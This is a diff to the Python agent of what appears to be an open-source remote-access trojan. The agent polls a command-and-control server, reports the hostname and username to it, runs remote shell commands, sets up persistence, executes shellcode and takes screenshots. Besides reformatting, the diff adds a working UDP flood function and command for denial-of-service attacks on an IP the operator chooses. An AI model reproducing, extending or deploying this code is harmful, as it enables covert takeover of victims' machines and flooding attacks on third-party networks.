@@ -1,28 +1,28 @@
 #!/usr/bin/env python3
 # coding: utf-8
 
-import requests
-import time
-import os
-import subprocess
-import platform
-import shutil
-import sys
-import traceback
-import threading
-import uuid
-import io
-import zipfile
-import tempfile
-import socket
+import config
+import ctypes
 import getpass
+import os
+import platform
+import re
+import requests
+import shutil
+import socket
+import subprocess
+import sys
+import tempfile
+import threading
+import time
+import traceback
+import uuid
+import zipfile
+
 if os.name == 'nt':
     from PIL import ImageGrab
 else:
     import pyscreenshot as ImageGrab
-import ctypes
-
-import config
 
 
 def threaded(func):
@@ -90,9 +90,15 @@ class Agent(object):
 
     def server_hello(self):
         """ Ask server for instructions """
-        req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
-                verify=config.TLS_VERIFY,
-                json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
+        req = requests.post(
+            config.SERVER + '/api/' + self.uid + '/hello',
+            verify=config.TLS_VERIFY,
+            json={
+                'platform': self.platform,
+                'hostname': self.hostname,
+                'username': self.username,
+            }
+        )
         return req.text
 
     def send_output(self, output, newlines=True):
@@ -104,9 +110,12 @@ class Agent(object):
             return
         if newlines:
             output += str("\n\n")
-        req = requests.post(config.SERVER + '/api/' + self.uid + '/report',
-                verify=config.TLS_VERIFY,
-                data={'output': output})
+
+        req = requests.post(
+            config.SERVER + '/api/' + self.uid + '/report',
+            verify=config.TLS_VERIFY,
+            data={'output': output}
+        )
 
     def expand_path(self, path):
         """ Expand environment variables and metacharacters in a path """
@@ -234,7 +243,7 @@ class Agent(object):
             self.send_output("[+] Archive created: %s" % zip_name)
         except Exception as exc:
             self.send_output(traceback.format_exc())
-   
+
     @threaded
     def screenshot(self):
         """ Takes a screenshot and uploads it to the server"""
@@ -268,6 +277,22 @@ class Agent(object):
              ctypes.pointer(ctypes.c_int(0)))
         self.send_output("[+] Shellcode executed.")
 
+    @threaded
+    def udpflood(self, ip, port, duration):
+        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        timeout = time.time() + duration
+        sent = 0
+        payload = os.urandom(1 * 2**10)
+
+        while True:
+            if time.time() > timeout:
+                s = 'Attack on {0} has finished. Sent {1} packages.'
+                self.send_output(s.format(ip, sent))
+                return
+
+            udp_socket.sendto(payload, (ip, port))
+            sent += 1
+
     def help(self):
         """ Displays the help """
         self.send_output(config.HELP)
@@ -275,16 +300,20 @@ class Agent(object):
     def run(self):
         """ Main loop """
         self.silent = True
+
         if config.PERSIST:
             try:
                 self.persist()
             except:
                 self.log("Failed executing persistence")
+
         self.silent = False
+
         while True:
             try:
                 todo = self.server_hello()
                 self.update_consecutive_failed_connections(0)
+
                 # Something to do ?
                 if todo:
                     commandline = todo
@@ -294,19 +323,23 @@ class Agent(object):
                     split_cmd = commandline.split(" ")
                     command = split_cmd[0]
                     args = []
+
                     if len(split_cmd) > 1:
                         args = split_cmd[1:]
                     try:
+
                         if command == 'cd':
                             if not args:
                                 self.send_output('usage: cd </path/to/directory>')
                             else:
                                 self.cd(" ".join(args))
+
                         elif command == 'upload':
                             if not args:
                                 self.send_output('usage: upload <localfile>')
                             else:
                                 self.upload(args[0],)
+
                         elif command == 'download':
                             if not args:
                                 self.send_output('usage: download <remote_url> <destination>')
@@ -315,35 +348,60 @@ class Agent(object):
                                     self.download(args[0], args[1])
                                 else:
                                     self.download(args[0])
+
                         elif command == 'clean':
                             self.clean()
+
                         elif command == 'persist':
                             self.persist()
+
                         elif command == 'exit':
                             self.exit()
+
                         elif command == 'zip':
                             if not args or len(args) < 2:
                                 self.send_output('usage: zip <archive_name> <folder>')
                             else:
                                 self.zip(args[0], " ".join(args[1:]))
+
                         elif command == 'python':
                             if not args:
                                 self.send_output('usage: python <python_file> or python <python_command>')
                             else:
                                 self.python(" ".join(args))
+
                         elif command == 'screenshot':
                             self.screenshot()
+
                         elif command == 'execshellcode':
                             if not args:
                                 self.send_output('usage: execshellcode <shellcode>')
                             else:
                                 self.execshellcode(args[0])
+
+                        elif command == 'udpflood':
+                            if not args or len(args) != 3:
+                                self.send_output('usage: udpflood <ip> <port> <duration in seconds>')
+                            else:
+                                ip, port, duration = args
+                                if not re.match(r'\d+\.\d+\.\d+\.\d+$', ip):
+                                    self.send_output('[error] Not a valid IP')
+                                elif not port:
+                                    self.send_output('[error] Not a valid port')
+                                elif not duration:
+                                    self.send_output('[error] Not a valid duration')
+                                else:
+                                    self.udpflood(ip, int(port), int(duration))
+
                         elif command == 'help':
                             self.help()
+
                         else:
                             self.runcmd(commandline)
+
                     except Exception as exc:
                         self.send_output(traceback.format_exc())
+
                 else:
                     if self.idle:
                         time.sleep(config.HELLO_INTERVAL)
@@ -352,6 +410,7 @@ class Agent(object):
                         self.idle = True
                     else:
                         time.sleep(0.5)
+
             except Exception as exc:
                 self.log(traceback.format_exc())
                 failed_connections = self.get_consecutive_failed_connections()
